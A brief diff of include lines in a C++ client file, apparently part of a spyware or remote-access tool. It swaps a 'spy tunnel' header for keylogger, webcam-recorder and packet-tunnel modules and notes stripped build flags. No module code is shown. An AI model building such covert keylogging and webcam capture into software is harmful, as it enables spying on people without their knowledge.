@@ -13,8 +13,9 @@
 #include "cldata_handler.hpp"
 #include "common.hpp"
 #include "client_macros.hpp"
-#include "clspy_tunnel.hpp"
-
+#include "clkeylogger.hpp"
+#include "clwebcam_recorder.hpp"
+#include "clpacket_tunnel.hpp"
 
 // g++ client.cpp -o client -Os -s
 // strip client
